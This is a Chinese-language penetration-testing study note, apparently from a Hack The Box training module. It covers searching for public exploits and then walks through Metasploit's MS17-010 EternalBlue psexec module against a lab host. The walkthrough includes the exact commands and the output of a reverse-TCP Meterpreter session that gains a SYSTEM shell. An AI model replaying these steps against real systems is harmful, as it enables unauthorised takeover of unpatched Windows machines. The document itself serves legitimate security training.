## Public Exploits 公開漏洞
### Finding Public Exploits  尋找公共漏洞
1. 在 Google 上搜尋應用程式名稱加上「exploit」這個關鍵字，看看是否能找到任何漏洞相關的資訊。
2. 使用工具 searchsploit 使用它來搜尋任何應用程式的公共漏洞/漏洞。

## Metasploit Primer(Metasploit 入門)
Metasploit Framework（MSF）是一款非常優秀的滲透測試工具。它內建了大量針對已公開漏洞的利用程式，並提供簡便的方式讓使用者可以針對易受攻擊的目標進行利用。除了漏洞利用功能外，MSF 還具備許多其他功能，例如：
- 執行偵察腳本以列舉遠端主機與已受感染的目標
- 使用驗證腳本測試漏洞是否存在，而無需實際入侵目標系統
- 可連線至 shell 並在受感染目標上執行命令
- 提供大量後滲透利用（Post-Exploitation）與橫向移動（Pivoting）工具

```
Coconut820@htb[/htb]$ msfconsole
```

一旦我們運行 Metasploit ，我們就可以使用 search exploit 命令搜尋我們的目標應用程式。例如，我們可以搜尋先前發現的 SMB 漏洞：
```
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
```

發現了該服務的一個漏洞。我們可以透過複製它的全名並使用 USE 來使用它：
```
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

在運行漏洞利用程式之前，我們需要配置其選項。若要查看可供設定的選項，我們可以使用 show options/options 指令:
```
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

任何 Required 設定為 yes 選項都需要進行設置，漏洞才能生效。在這種情況下，我們只有兩個選項需要設定： RHOSTS ，表示目標主機的 IP（這可以是一個 IP、多個 IP 或包含 IP 清單的檔案）。第二個選項 LHOST 代表攻擊主機的 IP（這可以是單一 IP，也可以是網路介面的名稱。在下面的範例中， LHOST 被設定為與我們的 tun0 介面關聯的 IP。）我們可以使用 set 指令設定它們：

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

在執行利用腳本之前，我們可以先進行檢查，以確認伺服器是否存在漏洞。
```
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

> [!Note]
> 伺服器確實存在漏洞。請注意，並非 Metasploit Framework 中的每一個漏洞模組都支援 check 功能。最後，我們可以使用 run 或 exploit 指令來執行漏洞利用。

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

我們已經能夠獲得該框的管理員存取權限，並使用 shell 命令將我們帶入互動式 shell